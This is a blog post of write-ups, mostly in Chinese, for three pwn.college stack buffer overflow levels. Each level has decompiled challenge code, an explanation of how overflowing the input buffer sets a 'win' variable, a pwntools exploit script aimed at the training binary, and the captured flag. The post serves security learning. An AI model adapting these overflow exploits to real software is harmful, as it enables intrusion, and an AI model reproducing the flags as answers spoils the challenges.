---
title: "Write-ups: pwn.college series"
pubDate: "2024-12-04"
categories: ["Write-ups"]
description: "Write-ups for pwn.college binary exploitation series."
---

## Table of contents

## Program Security (Memory Errors)

### Level 1.0

#### Information

- Category: Pwn

#### Description

> Overflow a buffer on the stack to set the right conditions to obtain the flag!

#### Write-up

分析得程序主要逻辑从 `challenge` 函数开始，反编译如下：

```c {9-10} del={55, 63} collapse={3-8, 11-54, 56-62, 64-83, 87-88} ins={"只要 v11[0] 的高 32 bits 不是 0 就可以调用 win":84-86}
__int64 __fastcall challenge(int a1, __int64 a2, __int64 a3)
{
  int *v3; // rax
  char *v4; // rax
  _QWORD v6[3]; // [rsp+0h] [rbp-50h] BYREF
  int v7; // [rsp+1Ch] [rbp-34h]
  int v8; // [rsp+24h] [rbp-2Ch]
  size_t nbytes; // [rsp+28h] [rbp-28h]
  _QWORD buf[2]; // [rsp+30h] [rbp-20h] BYREF
  _QWORD v11[2]; // [rsp+40h] [rbp-10h] BYREF
  __int64 savedregs; // [rsp+50h] [rbp+0h] BYREF
  _UNKNOWN *retaddr; // [rsp+58h] [rbp+8h] BYREF

  v7 = a1;
  v6[2] = a2;
  v6[1] = a3;
  v11[1] = __readfsqword(0x28u);
  buf[0] = 0LL;
  buf[1] = 0LL;
  v11[0] = 0LL;
  nbytes = 0LL;
  puts("The challenge() function has just been launched!");
  sp_ = (__int64)v6;
  bp_ = (__int64)&savedregs;
  sz_ = ((unsigned __int64)((char *)&savedregs - (char *)v6) >> 3) + 2;
  rp_ = (__int64)&retaddr;
  puts("Before we do anything, let's take a look at challenge()'s stack frame:");
  DUMP_STACK(sp_, sz_);
  printf("Our stack pointer points to %p, and our base pointer points to %p.\n", (const void *)sp_, (const void *)bp_);
  printf("This means that we have (decimal) %d 8-byte words in our stack frame,\n", sz_);
  puts("including the saved base pointer and the saved return address, for a");
  printf("total of %d bytes.\n", 8 * sz_);
  printf("The input buffer begins at %p, partway through the stack frame,\n", buf);
  puts("(\"above\" it in the stack are other local variables used by the function).");
  puts("Your input will be read into this buffer.");
  printf("The buffer is %d bytes long, but the program will let you provide an arbitrarily\n", 20);
  puts("large input length, and thus overflow the buffer.\n");
  puts("In this level, there is a \"win\" variable.");
  puts("By default, the value of this variable is zero.");
  puts("However, when this variable is non-zero, the flag will be printed.");
  puts("You can make this variable be non-zero by overflowing the input buffer.");
  printf(
    "The \"win\" variable is stored at %p, %d bytes after the start of your input buffer.\n\n",
    (char *)v11 + 4,
    20);
  puts("We have disabled the following standard memory corruption mitigations for this challenge:");
  puts("- the binary is *not* position independent. This means that it will be");
  puts("located at the same spot every time it is run, which means that by");
  puts("analyzing the binary (using objdump or reading this output), you can");
  puts("know the exact value that you need to overwrite the return address with.\n");
  cp_ = bp_;
  cv_ = __readfsqword(0x28u);
  while ( *(_QWORD *)cp_ != cv_ )
    cp_ -= 8LL;
  nbytes = 4096LL;
  printf("You have chosen to send %lu bytes of input!\n", 4096LL);
  printf("This will allow you to write from %p (the start of the input buffer)\n", buf);
  printf(
    "right up to (but not including) %p (which is %d bytes beyond the end of the buffer).\n",
    &buf[nbytes / 8],
    nbytes - 20);
  printf("Send your payload (up to %lu bytes)!\n", nbytes);
  v8 = read(0, buf, nbytes);
  if ( v8 < 0 )
  {
    v3 = __errno_location();
    v4 = strerror(*v3);
    printf("ERROR: Failed to read input -- %s!\n", v4);
    exit(1);
  }
  printf("You sent %d bytes!\n", v8);
  puts("Let's see what happened with the stack:\n");
  DUMP_STACK(sp_, sz_);
  puts("The program's memory status:");
  printf("- the input buffer starts at %p\n", buf);
  printf("- the saved frame pointer (of main) is at %p\n", (const void *)bp_);
  printf("- the saved return address (previously to main) is at %p\n", (const void *)rp_);
  printf("- the saved return address is now pointing to %p.\n", *(const void **)rp_);
  printf("- the canary is stored at %p.\n", (const void *)cp_);
  printf("- the canary value is now %p.\n", *(const void **)cp_);
  printf("- the address of the win variable is %p.\n", (char *)v11 + 4);
  printf("- the value of the win variable is 0x%x.\n", HIDWORD(v11[0]));
  putchar(10);

  if ( HIDWORD(v11[0]) )
    win();
  puts("Goodbye!");
  return 0LL;
}
```

注意到这里判断了 `v11[0]` 的高 32 bits。这时只要 `v11[0]` 的高 32 bits 不是 `0` 就都可以进入 `if` 内部，调用 `win`：

```c
if ( HIDWORD(v11[0]) ) { win(); }
```

所以我们要做的就是想办法覆盖 `v11[0]` 的高 32 bits。

```c
_QWORD buf[2]; // [rsp+30h] [rbp-20h] BYREF
_QWORD v11[2]; // [rsp+40h] [rbp-10h] BYREF

// ...

nbytes = 4096LL;
// ...
v8 = read(0, buf, nbytes);
```

这里 `read` 最多可以读取 4096 bytes 到 `buf`。但是我们的 `buf` 只有 16 bytes，故存在缓冲区溢出问题，导致覆盖 `v11` 的值。

所以我们只要先输入 16 bytes 填满 `buf`，再多写 5 bytes 就可以达到破坏 `v11[0]` 的高 32 bits 的目的。（注意 `read` 会把回车读进去，所以本地执行可以只输入 20 bytes）

#### Exploit

```python
#!/usr/bin/python3

from pwn import context, ELF, process, remote, gdb

context(os="linux", arch="amd64", log_level="debug", terminal="kitty")

FILE = "./binary-exploitation-first-overflow-w"
HOST = "pwn.college"
PORT = 1337

gdbscript = """
c
"""


def launch(local=True, debug=False):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug([elf.path], gdbscript=gdbscript)
        else:
            return process([elf.path])
    else:
        return remote(HOST, PORT)


target = launch()

payload = b"A" * 21
target.send(payload)

target.recvall()
```

#### Flag

Flag: `pwn.college{oQdReDoKIU218v6uPGguMuFOJnt.0VO4IDL5cTNxgzW}`

### Level 1.1

#### Information

- Category: Pwn

#### Description

> This challenge is identical to its "easy" version from a security perspective, but has the following changes:

1. Unlike the easy version, it does not give you helpful debug output. You will have to recover this information using a debugger.
2. For all other "hard" versions, the source code will not be provided, and you will need to reverse-engineer the binary using your knowledge of the "easy" version as a reference. However, for this one challenge, to get you familiar with the differences between the easy and hard versions, we will provide the source code.
3. Some randomization is different. Buffers might have different lengths, offsets might vary, etc. You will need to reverse engineer this information from the binary!

#### Write-up

```c {5-6} del={13} ins={"v4 不为 0 即可调用 win":20-22}
__int64 challenge()
{
  int *v0; // rax
  char *v1; // rax
  _QWORD buf[4]; // [rsp+30h] [rbp-30h] BYREF
  int v4; // [rsp+50h] [rbp-10h]
  unsigned __int64 v5; // [rsp+58h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  memset(buf, 0, sizeof(buf));
  v4 = 0;
  printf("Send your payload (up to %lu bytes)!\n", 4096LL);
  if ( (int)read(0, buf, 0x1000uLL) < 0 )
  {
    v0 = __errno_location();
    v1 = strerror(*v0);
    printf("ERROR: Failed to read input -- %s!\n", v1);
    exit(1);
  }

  if ( v4 )
    win();
  puts("Goodbye!");
  return 0LL;
}
```

```c
_QWORD buf[4]; // [rsp+30h] [rbp-30h] BYREF
int v4; // [rsp+50h] [rbp-10h]

// ...

if ( (int)read(0, buf, 0x1000uLL) < 0 ) { /* ... */ }

// ...

if ( v4 ) { win(); }
```

由于程序根据 `v4` 的值来判断是否执行 `win`，所以只要令 `v4` 不为 0 即可。

注意到 `buf` 只有 32 bytes，但是最大可以输入 4096 bytes，导致溢出覆盖 `v4` 的值。

#### Exploit

```python
#!/usr/bin/python3

from pwn import context, ELF, process, remote, gdb

context(os="linux", arch="amd64", log_level="debug", terminal="kitty")

FILE = "./binary-exploitation-first-overflow"
HOST = "pwn.college"
PORT = 1337

gdbscript = """
c
"""


def launch(local=True, debug=False):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug([elf.path], gdbscript=gdbscript)
        else:
            return process([elf.path])
    else:
        return remote(HOST, PORT)


target = launch()

payload = b"A" * 33
target.send(payload)

target.recvall()
```

#### Flag

Flag: `pwn.college{cwWgAcBgDsBnGFTCky9i1NRqAtO.0FM5IDL5cTNxgzW}`

### Level 2.0

#### Information

- Category: Pwn

#### Description

> Overflow a buffer on the stack to set trickier conditions to obtain the flag!

#### Write-up

```c {8-12, 22-25, 55} ins={"想办法令 *v11 = 240324168 即可":84-86} del={63} collapse={3-7, 13-21, 26-54, 56-62, 64-83, 87-88}
__int64 __fastcall challenge(int a1, __int64 a2, __int64 a3)
{
  int *v3; // rax
  char *v4; // rax
  _QWORD v6[3]; // [rsp+0h] [rbp-D0h] BYREF
  int v7; // [rsp+1Ch] [rbp-B4h]
  int v8; // [rsp+24h] [rbp-ACh]
  size_t nbytes; // [rsp+28h] [rbp-A8h] BYREF
  void *buf; // [rsp+30h] [rbp-A0h]
  int *v11; // [rsp+38h] [rbp-98h]
  _BYTE v12[128]; // [rsp+40h] [rbp-90h] BYREF
  int v13; // [rsp+C0h] [rbp-10h] BYREF
  unsigned __int64 v14; // [rsp+C8h] [rbp-8h]
  __int64 savedregs; // [rsp+D0h] [rbp+0h] BYREF
  _UNKNOWN *retaddr; // [rsp+D8h] [rbp+8h] BYREF

  v7 = a1;
  v6[2] = a2;
  v6[1] = a3;
  v14 = __readfsqword(0x28u);
  memset(v12, 0, sizeof(v12));
  v13 = 0;
  buf = v12;
  v11 = &v13;
  nbytes = 0LL;
  puts("The challenge() function has just been launched!");
  sp_ = (__int64)v6;
  bp_ = (__int64)&savedregs;
  sz_ = ((unsigned __int64)((char *)&savedregs - (char *)v6) >> 3) + 2;
  rp_ = (__int64)&retaddr;
  puts("Before we do anything, let's take a look at challenge()'s stack frame:");
  DUMP_STACK(sp_, sz_);
  printf("Our stack pointer points to %p, and our base pointer points to %p.\n", (const void *)sp_, (const void *)bp_);
  printf("This means that we have (decimal) %d 8-byte words in our stack frame,\n", sz_);
  puts("including the saved base pointer and the saved return address, for a");
  printf("total of %d bytes.\n", 8 * sz_);
  printf("The input buffer begins at %p, partway through the stack frame,\n", buf);
  puts("(\"above\" it in the stack are other local variables used by the function).");
  puts("Your input will be read into this buffer.");
  printf("The buffer is %d bytes long, but the program will let you provide an arbitrarily\n", 127);
  puts("large input length, and thus overflow the buffer.\n");
  puts("In this level, there is a \"win\" variable.");
  puts("By default, the value of this variable is zero.");
  puts("However, if you can set variable to 0x0e530e48, the flag will be printed.");
  puts("You can change this variable by overflowing the input buffer, but keep endianness in mind!");
  printf(
    "The \"win\" variable is stored at %p, %d bytes after the start of your input buffer.\n\n",
    v11,
    (_DWORD)v11 - (_DWORD)buf);
  cp_ = bp_;
  cv_ = __readfsqword(0x28u);
  while ( *(_QWORD *)cp_ != cv_ )
    cp_ -= 8LL;
  printf("Payload size: ");
  __isoc99_scanf("%lu", &nbytes);
  printf("You have chosen to send %lu bytes of input!\n", nbytes);
  printf("This will allow you to write from %p (the start of the input buffer)\n", buf);
  printf(
    "right up to (but not including) %p (which is %d bytes beyond the end of the buffer).\n",
    (char *)buf + nbytes,
    nbytes - 127);
  printf("Send your payload (up to %lu bytes)!\n", nbytes);
  v8 = read(0, buf, nbytes);
  if ( v8 < 0 )
  {
    v3 = __errno_location();
    v4 = strerror(*v3);
    printf("ERROR: Failed to read input -- %s!\n", v4);
    exit(1);
  }
  printf("You sent %d bytes!\n", v8);
  puts("Let's see what happened with the stack:\n");
  DUMP_STACK(sp_, sz_);
  puts("The program's memory status:");
  printf("- the input buffer starts at %p\n", buf);
  printf("- the saved frame pointer (of main) is at %p\n", (const void *)bp_);
  printf("- the saved return address (previously to main) is at %p\n", (const void *)rp_);
  printf("- the saved return address is now pointing to %p.\n", *(const void **)rp_);
  printf("- the canary is stored at %p.\n", (const void *)cp_);
  printf("- the canary value is now %p.\n", *(const void **)cp_);
  printf("- the address of the win variable is %p.\n", v11);
  printf("- the value of the win variable is 0x%x.\n", *v11);
  putchar(10);

  if ( *v11 == 240324168 )
    win();
  puts("Goodbye!");
  return 0LL;
}
```

```c
size_t nbytes; // [rsp+28h] [rbp-A8h] BYREF
void *buf; // [rsp+30h] [rbp-A0h]
int *v11; // [rsp+38h] [rbp-98h]
_BYTE v12[128]; // [rsp+40h] [rbp-90h] BYREF
int v13; // [rsp+C0h] [rbp-10h] BYREF

v13 = 0;
buf = v12;
v11 = &v13;
nbytes = 0LL;

// ...

__isoc99_scanf("%lu", &nbytes);

// ...

v8 = read(0, buf, nbytes);

// ...

if ( *v11 == 240324168 ) { win(); }
```

如果 `v11` 指向的地址的内容为 `240324168` 则触发 `win`。

注意到我们的 `buf` 为 128 bytes，由于最大输入长度可由我们自己自定义，因此可以溢出 `buf` 破坏 `v13`，将 `v13` 修改为 `240324168` 即可。

#### Exploit

```python
#!/usr/bin/python3

from pwn import context, ELF, process, remote, gdb, p64

context(os="linux", arch="amd64", log_level="debug", terminal="kitty")

FILE = "./babymem-level-2-0"
HOST = "pwn.college"
PORT = 1337

gdbscript = """
c
"""


def launch(local=True, debug=False):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug([elf.path], gdbscript=gdbscript)
        else:
            return process([elf.path])
    else:
        return remote(HOST, PORT)


target = launch()

payload = b"".ljust(128, b"A") + p64(240324168)
payload_size = str(len(payload)).encode()

target.recvuntil(b"Payload size: ")
target.sendline(payload_size)
target.recvuntil(b"Send your payload")
target.send(payload)

target.recvall()
```

#### Flag

Flag: `pwn.college{w7aHpdU-9AlFvJ5GtohCFtGwF7M.ddTNzMDL5cTNxgzW}`
